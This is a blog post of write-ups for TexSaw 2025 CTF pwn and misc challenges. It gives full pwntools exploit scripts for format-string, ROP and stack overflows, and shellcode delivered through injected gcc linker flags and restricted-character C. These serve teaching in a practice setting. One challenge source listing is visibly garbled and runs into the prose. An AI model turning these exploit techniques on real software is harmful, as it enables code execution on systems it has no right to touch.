---
title: TexSaw-2025
published: 2025-04-14
description: ''
image: ''
tags: [ctf,pwn,misc]
category: 'Writups'
draft: false 
lang: ''
---



:::important
I didnt test the payloads remotely so they can be wrong, but they work locally at least 
:::

:::caution
I just collected the solutions and understood them, i didnt solve the hard challs some great and smart ppl did, i just read and tried to understand them :)     
big thanks to  `oh_word` for his writups, without him i wouldnt be able to do this
:::

</br>


# ez_printf
<center> <img src="/Blog/TexSaw-2025/36_ez_printf/card.png"/>  </center>

as the name suggests, this is a ez printf chall so i wont wast your time with it.
chall has two `printf(user_input)`, and a `win` function.      
so leak the **stack** and **pie** with the first one, overwrite return address of **main** with `win` and thats it :)

<details>
  <summary>payload</summary>

```python
from pwn import *

context.log_level = logging.ERROR
elf = context.binary = ELF("vuln")


p = process()
# p = remote("74.207.229.59",20221)

p.recvuntil("t twice")
p.recvline()

p.sendline(f"%1$p|%3$p|%27$p")
STACK , LIBC, PIE = p.recvline().strip().split(b"|")
STACK = int(STACK[2:],16)
PIE = int(PIE[2:],16) - 0x11b3

print(hex(STACK))
print(hex(PIE))

elf.address = PIE

payload = fmtstr_payload(6,{STACK - 8: elf.sym["win"] + 1,},write_size="short")
print("payload len: ",hex(len(payload)))
p.sendline(payload)


p.interactive()
```     
</details>


<br/>

# ex_rop
<center> <img src="/Blog/TexSaw-2025/9_ez_rop/card.png"/>  </center>

this is a intersting chall,  we have a buffer overflow caused by a read syscall of 0x80 (so we have a syscall gadget) but unfortunately we dont have a pop_rax / pop_rdx / pop_rsi gadget so we cant just call execv, the chall provides a pop_rdi gadget in a function called **weird_func**.     

the idea of this chall is to use the main function as a pop_rax gadget. once read finishes reading, it stores the number of read bytes in rax, so we can controle rax value by jumping to the main function and reading a set amount of bytes.
```asm
# main function
push   rbp
mov    rbp,rsp
lea    rcx,[rbp-0x20]
mov    rax,0x0
mov    rdi,0x0
mov    rsi,rcx
mov    rdx,0x80
syscall 
pop    rbp
ret  
```

so great, now we have a pop_rax gadget, for the pop_rsi gadget if we jump to the main function `lea    rcx,[rbp-0x20]` we can set it from the stack which we controle.    
for the pop_rdx gadget tho it much harder, we got to use pop_rdi and pop_rax gadgets to call write, leak the content of the stack then get a address related to the linker. from that we can extract a real pop_rax gadget and a pop_rdx gadget and rop into execv.    


<details>
  <summary>payload</summary>

```python
from pwn import *


elf = context.binary = ELF("easy_rop")
p = process()

SYSCALL = 0x00401126
RDI_RBP = 0x40112e

p.sendline(cyclic(40) + flat([
    elf.sym.main,    # go to main, read one byte aka rax = 1 
    RDI_RBP , 1 , 0, # set rdi = 1
    SYSCALL , 0,     # write syscall
    elf.sym.main,    # back to main for second payload
]))
sleep(0.1)
p.send("1")


for i in range(12):
    p.recv(8)
    # print(hex(u64(p.recv(8))))



STACK = u64(p.recv(8))
p.recv(8)



LD = u64(p.recv(8)) - 0x32020
RAX_RDX =  LD + 0x000000000001aa3e #: pop rax ; pop rdx ; pop rbx ; ret

print(hex(LD))
print(hex(STACK))


gdb.attach(p,"b *main+35")
p.sendline(b"\x00" * (40 - 8) + flat([
    b"/bin/sh\x00",                 # /bin/sh in the stack
    RAX_RDX, 0x3b, 0, 0,            # rax = 0x3b, rdx = 0
    RDI_RBP , STACK - 0xf0  , 0,    # rdi = addr(/bin/sh)
    SYSCALL,                        # execv,
])) 


p.interactive()
```     
</details>


<br/>

# teleportation
<center> <img src="/Blog/TexSaw-2025/1_teleportation/card.png"/>  </center>

for this chall, we have a maze we can do 4 actions (0: Look around, 1: Interact, 2: Go up, 3: Go down), where we navigate lvls and the only valid `lvls` are (-1,0,1,2,3,4,**-88**).      
we want to reach lvl **-88** because we have a fgets stack overflow there, but we only can go as high as 4 and as low as *-1*      
fortunately lvl **-1** contains a out of bounds **integer** write  into the stack, so we can overwrite the value of `lvl` to **-88**     
once we do that we have controle over the return pointer of turn (using the bof), but before that we need some kinda of leak    
now its time for the painfull part, getting the leak. the idea is the overwrite a part of `rbp` to a null byte (fgets sets the last byte at null so just stop before the register and it will write it)     
to do that we write **87 bytes** into the stack (last byte for fgets), by doing this we will be overwrite the value of the `lvl` too, and the game has some logic to check if the `lvl` is  any of the mentioned above if not it returns and this is for some reason  is causing a crash (i think `rbp` overwriting is the reason because the stack gets messed up)       
to avoid that when we overflow the stack we overflow it with the value **-88**, so next time we will have a second bof and a hopfully a leak      
you can encounter three states when overwriting `rbp` first byte with zero (craching , useless leaks, invalid lvl), i just restart the exploit when i encounter one of those (my script is in a while true loop)  
```python
status = p.poll()
if status is not None:
    # process died bc of a bad read 
    print("Preocess Died")
    return

p.recvuntil("3: ")
LIBC =  p.recvline().strip()
if b"null" in LIBC or b"around" in LIBC or b"where" in LIBC:
    # we didnt overwrite correctly
    print("Bad Output")
    p.close()
    return

p.sendline("1")
if b"Please" not in p.clean(): 
    # lvl is not valid
    print("Invalid Lvl")
    p.close()
    return    

```

ok, if you reach this stage that would mean you have a libc leak with a bof, so just one gadget your way into rce      



<details>
  <summary>payload</summary>

```python
from pwn import *

context.log_level = "ERROR"
elf = context.binary = ELF("chall")

def x():
    p = process()

    s = lambda i: p.recvuntil("3: Go down") and p.sendline(str(i)) 

    s(3)                    # down
    s(0); s(1)              # look + interact
    p.sendline("runestone") # unlock arb int write

    s(2)                    # up
    s(2)                    # up
    s(2)                    # up


    s(0); s(1)               
    p.sendline("42")         # offset of lvl in stack
    p.sendline("-88")        # new value of lvl
    
    # now we are in the hidden lvl
    s(0); s(1)               
    p.sendline(p32(-88,sign="signed") * 19 + b"B" * 3)  # spam -88 in stack and overwrite rbp last byte with 00, fgets does this by default so we just stop before rbp

    sleep(0.2)
    status = p.poll()
    if status is not None:
        # process died bc of a bad read 
        print("Preocess Died")
        return

    p.recvuntil("3: ")
    LIBC =  p.recvline().strip()
    if b"null" in LIBC or b"around" in LIBC or b"where" in LIBC:
        # we didnt overwrite correctly
        print("Bad Output")
        p.close()
        return

    p.sendline("1")
    if b"Please" not in p.clean(): 
        # lvl is not valid
        print("Invalid Lvl")
        p.close()
        return
    
    # libc leak
    LIBC = u64(LIBC.ljust(8,b"\x00")) 
    LIBC -= 0x1ed6a0
    print(hex(LIBC))

    p.sendline("0") # padding


    # gdb.attach(p,"b *turn+2151")
    p.sendline("1")
    # one_gadget 
    p.sendline( cyclic(80) + p64(LIBC + 0x21a000 + 0x200)  + p64(LIBC + [0xe3afe,0xe3b01,0xe3b04][1]))

    p.interactive()

while True:
    x()
```     
</details>



<br/>

:::note
Its important to note that the gcc challs are not your standard pwn, they are more like misc
:::


# slop
<center> <img src="/Blog/TexSaw-2025/1_slop/card.png"/>  </center>


:::note
All the credit goes to **oh_word** discord user for this
:::

first time seeing a chall like this, not your usual binary explotation but a very fun chall never the less.    
we have this python file: 
```python
#!/usr/bin/python3

import re
from os import chdir
from subprocess import run
from tempfile import TemporaryDirectory

code = ''
main = input('main? ')

assert re.match(r'[a-zA-Z_][a-zA-Z0-9_]*', main)
# assert len(set(code)) <= 5

# gcc = ['gcc', 'a.c', f'-Wl,--defsym=main={main},-T,a.ld']
gcc = ['gcc', 'a.c', f'-Wl,--defsym=main={main}']

with TemporaryDirectory() as d:
    # chdir(d)
    with open('a.c', 'w') as f:
        f.write(code)
    # with open('a.ld', 'w') as f:
    #     f.write('MEMORY { _ (rwx) : ORIGIN = 0x100000, LENGTH = 0x1000 }')
    assert run(gcc, capture_output=True).returncode == 0
    run(['./a.out'])
```

- it takes a input in the `main?` 
- checks if that input is in a valid format (text then numbers) 
- adds the input in gcc linker options
- creats a empty `a.c` file, compiles it and runs it

as we can see we only have controle of the linker option, first of all lets understand what does `--defsym` do. `--defsym` defines a sym so here we are setting the sym main to the value we inserted.      
for example: if **a.c** contains
```c
void myFunc() {
  return -1;
}
```
and we set the input to be **myFunc**, the linker will treat myFunc as the **main** function, now that we have this out of the way lets talk about the vuln here.    
the vuln here is in the input, we are not limited so we can even insert our own options in the linker and the file will be compiled with those options,     
example of this: if we send `_start,-no-pie` to the input, the file will be compiled with no pie.     
all what we have left now is to find the right flags to gain rce.
and the flags are: 
- `-no-pie`: so we know the position of the code, text and all segements
- `--defsym`: first `defsym` will be use to skip the regex constraint, the second will set our main function to some address in the binary
- `-z,noseparate-code`: this will remove the seperation between code and other sections, so we can execute code in any place, even in the data sections
- `--build-id`: sets the build-id value in **note.gnu.build-id** section, notice we can controle data in the binary!!!! 

the exploit will set the **main sym** to the address of the **build-id**, which is a value we can controle, and because we have **-z,noseparate-code** we can excute the code in that section, giving us arbitrary code execution!!



<details>
  <summary>payload</summary>

```python
from pwn import *
import time

p = process(['python3', 'main.py'])

code = [
    b"/bin/sh\0",
    b"\xbf\x08\x03\x40\x00", # mov edi, 0x400308
    b"\x31\xf6", # xor esi, esi
    b"\x31\xd2", # xor edx, edx
    b"\x6a\x3b", # push 0x3b
    b"\x58", # pop rax
    b"\x0f\x05", # syscall
]
raw = b"".join(code)


payload = "_start" # skip the regex check
payload += ",--defsym=main=0x400310" # after skiping the check, we can set it to some address we controle  
payload += ",-no-pie"
payload += ",-z,noseparate-code"
payload += f",--build-id=0x{raw.hex()}" # our code 

p.sendline(payload)

p.interactive()
```     
</details>


<br/>


# scfuck
<center> <img src="/Blog/TexSaw-2025/1_scfuck/card.png"/>  </center>

the chall seems to be a continuation of the `slop` chall, even tho the format is the same the exploits are very different.     
we are given this
```python
#!/usr/bin/python3

import re
from os import chdir
from subprocess import run
from tempfile import TemporaryDirectory

code = input('code? ')
print(set(code))
main = input('main? ')

assert re.fullmatch(r'[a-zA-Z_][a-zA-Z0-9_]*', main)
assert len(set(code)) <= 5

gcc = ['gcc', 'a.c', f'-Wl,--defsym=main={main},-T,a.ld']

with TemporaryDirectory() as d:
    chdir(d)
    with open('a.c', 'w') as f:
        f.write(code)
    with open('a.ld', 'w') as f:
        f.write('MEMORY { _ (rwx) : ORIGIN = 0x100000, LENGTH = 0x1000 }')
    assert run(gcc, capture_output=True).returncode == 0
    run(['./a.out'])
```

so we are expected:
- provide some c code with 5 unique chars with no length limitations
- set the address of main to where we want code to be executed

`MEMORY { _ (rwx) : ORIGIN = 0x100000, LENGTH = 0x1000 }` makes one segment with `rwx` permissions so we can execute data, we dont need to send a function...          
this is a problem of [Fewest (distinct) characters for Turing Completeness](https://codegolf.stackexchange.com/questions/110648/fewest-distinct-characters-for-turing-completeness/110834#110834) which is already solved by our friend in that post.   

the conditions to make it work are in this paragraph
> ..where the sequence of constants (of the form 1...+1...+1...) contains the machine code representation of your program. This assumes that your environment permits all memory segments to be executed (apparently true for tcc [thanks @Dennis!] and some machines without NX bit). Otherwise, for Linux and OSX you may have to prepend the keyword const and for Windows you may have to add a #pragma explicitly marking the segment as executable.
> As an example, the following program written in the above style prints Hello, World! on Linux and OSX on x86 and x86_64.


exmaple of the post idea:   
```c
main[] = {1111111111+111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+1+1+1+1+1+1+1+1+1,111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+11,11111111+1111111+1111111+1111111+1111111+1111111+111111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+1,1111111111+111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+11111+11111+1111+1111+1111+1111+1111+111+111+111+111+111+11+11+11+11+11+11+1+1+1+1+1+1,111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+111+11+11+11+11+11+1+1+1,1111111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+111+11+11+11+11+11+11+11+1+1+1+1+1,11111111+11111111+1111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+11+11+11+1+1+1+1+1+1+1,1111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+11+11+11+11+11+1+1,111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+11111+11111+11111+1111+1111+1111+111+11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1,1+1+1+1+1}
```
this is a hello world program, it just the standard shellcode to write 'hello world' to stdout, it creates a array called main (name of entry point) sets it elements as sums of `1....1` because of the char length limitations.      
the array on top when removing the sums of ones is just 
```c
main[] = {0x656d7368, 0x24348101, 0x1010101, 0x6568b848, 0x206f6c6c, 0x48506f77, 0x16ae689, 0x5a0e6a5f, 0xf58016a, 0x5}
```
which is a just a `sh = asm(shellcraft.write(1,"hello world",14))` 

<details>
  <summary>python decoding example</summary>

```python
from pwn import *

context.arch = 'amd64'

main = [1111111111+111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+1+1+1+1+1+1+1+1+1,111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+11,11111111+1111111+1111111+1111111+1111111+1111111+111111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+1,1111111111+111111111+111111111+111111111+111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+11111+11111+1111+1111+1111+1111+1111+111+111+111+111+111+11+11+11+11+11+11+1+1+1+1+1+1,111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+111+11+11+11+11+11+1+1+1,1111111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+1111+1111+1111+111+111+111+111+111+111+111+111+11+11+11+11+11+11+11+1+1+1+1+1,11111111+11111111+1111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+11+11+11+1+1+1+1+1+1+1,1111111111+111111111+111111111+111111111+11111111+11111111+11111111+11111111+11111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+1111111+111111+111111+111111+111111+111111+111111+111111+111111+1111+1111+1111+1111+111+111+111+111+111+111+111+11+11+11+11+11+11+1+1,111111111+111111111+11111111+11111111+11111111+1111111+111111+111111+111111+111111+111111+111111+11111+11111+11111+11111+11111+11111+11111+11111+1111+1111+1111+111+11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1,1+1+1+1+1]
main = [hex(i) for i in main]
print(main)


# Step 1: Combine into one big integer
big_num = 0
shift = 0
for h in main:
    value = int(h, 16)
    big_num |= value << shift
    shift += (value.bit_length() + 7) // 8 * 8  # align to full bytes

# Step 2: Convert to bytes (little-endian)
byte_len = (big_num.bit_length() + 7) // 8
shellcode = big_num.to_bytes(byte_len, 'little')


print(disasm(shellcode))
```     
</details>

ok now that we got the basics, for our exploit we use the ideas on top to run a `sh` shell, here is the basic structure of the code:    
```c
a=111+111+11;aa=1111111111+1111...;....;aaaaa=1111+11....; 
```
ours chars are `[a,=,1,+,;]` so our payload is correct and will pass the test of unique chars, and we have executable data section, all what we have to do is set `a` as our entry by sending `a` to `main = input('main? ')`.  

its imporatnt to note that we are using the compiler optimazation to fill the blanks here, we didnt set the type of `a's` but the compiler will treat it as a`int`, and the compiler will place the data in contegouees memory effectify writing the shellcode  

<details>
  <summary>payload</summary>

```python
from pwn import *

context.update(arch='amd64', os='linux')
p = process(["python3","main.py"])

# get the shellcode
sh = asm(shellcraft.write(1,"hello world",14))
exploit = ""

# this will split our shellcode to 4 bytes aka integers
for i in range(0,len(sh), 4):
    elem = int.from_bytes(sh[i:i+4],byteorder="little")


    # this code will convert the number elem into the format 11111...1+1111..1+....
    output = []
    j = 20 # this is showsen randomly, it just needs to be bigger then 2**31 - 1 (max size of int)
    while elem > 0:
        num = int("1" * j)              # calc the number
        while elem >= num:              # check if its lesser then our elem
            output.append(str(num))     # if so keep subtracting it and storing the number
            elem -= num
        j -= 1                          # now repeat
    
    exploit += "a" * (i // 4 + 1)   +"=" + "+".join(output) + ";" # appends aa....a=1...1+1..1; to our script


print(exploit)
p.sendline(exploit)
p.sendline("a") # set main = a, to start executing from the
p.interactive() # shell

```     
</details>




# gccfuck
<center> <img src="/Blog/TexSaw-2025/0_gccfuck/card.png"/>  </center>
we are given

```python
#!/usr/bin/python3

from os import chdir
from subprocess import run
from tempfile import TemporaryDirectory

code = input('code? ')
print(sorted(list(set(code))))
assert len(set(code)) <= 12

with TemporaryDirectory() as d:
    chdir(d)
    with open('a.c', 'w') as f:
        f.write(code)t
in this chall we dont have executable data section  and we are limited to 12 unique chars.     
the idea of this chall is the same as the other challs, get our shellcode which is data to run, here we can try to use the same idea as before:    
```c
a; // need to define a before using it
main(){
a=.....; // shellcode in the format of a=111111111+111+111....;a=11111111+1111111111...;
}
```  
the problem here is that we really cant run `a` as a function so we need a way to jump to it or call it, and notice that we used the limit of 12 chars, 9 of them is taken by `main(){;}` and 3 in `=+1`, we got to change something in the second set since the first one is needed to get the code compiled in the first place.    
so we need to call `a`, that means we need a function to point to it and then call it, smth like: 
```c
a;n;
main(){\
a=.....; // shellcode in the format of a=111111111+111+111....;a=11111111+1111111111...;
n = shellcode_address; // shellcode_address is inside the op that asignes to a
                       // we have ► 0x40110e <main+8>     mov    dword ptr [rip + 0x2f20], 0x6ebc031     [a] <= 0x6ebc031
                       // so set n = 0x40110e + 6, leaving you with 4 bytes to write the shellcode, 2 for seting a register and two for jumping to the next shellcode instruction 
n();
}\
```  
unfortunately this wont compile bc we need to define `n` as a function pointer (by default its defined as a `int`), so we need smth like `(*n)()` which equivalant to `void (*n)()`, as you can see we added a new char `*` but we already run out of space so we need to replace a char, turns out we can replace our `1` by the `*` but change our whole method of writing data.      
the key here is to use gcc compiler optimizations to define our shellcode bytes. check the example: 
```c
a;
main() {
    a = ((main == main) + (main == main) * (main == main) + (main == main)); // aka b = 4;
}
```
in the example above `b` is assigned to that mess of expersion but the compiler is smart enough to compute the final value, the compiler will convert `(main == main)` to `1` and preform the calculations (1 + 1) * (1 + 1) = 4.   
we effectively replaced `1` by `*`


here is a general function made by `no_word`:
```python
# this function turns a number into collection of base 2 ops
# example
# 15 = 1111 => 2^0    + 2^1             + 2^2                                   + 2^3 
#           => (i==i) + ((i==i)+(i==i)) + (((i==i)+(i==i)) * ((i==i)+(i==i)))   + (((i==i)+(i==i)) * ((i==i)+(i==i)) * ((i==i)+(i==i)))
def make_num(num):
    ret = []
    for i, c in enumerate(bin(num)[2:][::-1]): # bin re
        if c == "0": continue

        if i > 0:
            two = "((a==a)+(a==a))"
            bit = "*".join([two] * i)
            ret.append(bit)
        else:
            ret.append("(a==a)")

    return "+".join(ret)
```

finally we just use our new method to store the shellcode then jump to it

<details>
  <summary>payload</summary>

```python
from pwn import *
# credits goes to no_word for this function and the idea
def make_num(num):
    ret = []
    for i, c in enumerate(bin(num)[2:][::-1]):
        if c == "0": continue
        if i > 0:
            two = "((a==a)+(a==a))"
            bit = "*".join([two] * i)
            ret.append(bit)
        else:
            ret.append("(a==a)")

    return "+".join(ret)

def get_exploit(code):
    exploit = ""
    for i in range(0,len(code), 4):
        instr = int.from_bytes(code[i:i+4],byteorder="little")
        exploit += "a"   +"=" +make_num(instr) + ";"
    return exploit


context.update(arch='amd64', os='linux')
p = process(["python3","main.py"])


code = [
    asm("xor eax, eax"),    # 2 bytes for setting the register
    asm("jmp $+8"),         # two bytes for jumping
    asm("xor edx, edx"),    
    asm("jmp $+8"),     
    asm("xor esi, esi"),
    asm("jmp $+8"),
    asm("mov al, 0x3b"),    # we sent BINSH address as a arg, meaning rdi is already pointing to a BINSH gadget
    asm("syscall"),
]

code = b"".join(code)

shellcode = get_exploit(code)
SHELLCODE = 0x401114
BINSH = 0x404028


# explanation 
#   a;                                  // we define a
#   (*n)();                             // we define n as a function pointer
#   m = make_num(u32(b"/bin"));         // we set m=/bin and mm=/sh\x00 effectively writing /bin/sh into the address of m (BINSH)
#   mm= make_num(u32(b"/sh\00"));                    
#   main(){
#       shellcode;                      // set a to shellcode bytes
#       n=make_num(SHELLCODE);          // again set n = SHELLCODE
#       n(make_num(BINSH));             // calling our shellcode
#   }

code = """\
a;\
m=%s;mm=%s;\
(*n)();\
main(){%s;a=%s;n=a;n(%s);}\
""" % (make_num(u32(b"/bin")),make_num(u32(b"/sh\00")),shellcode,make_num(SHELLCODE),make_num(BINSH))

p.sendline(code)
p.interactive() # shell, if it doesnt work localy compile with no pie: assert run(['gcc', 'a.c','-no-pie'], capture_output=True).returncode == 0
```     
</details>

    
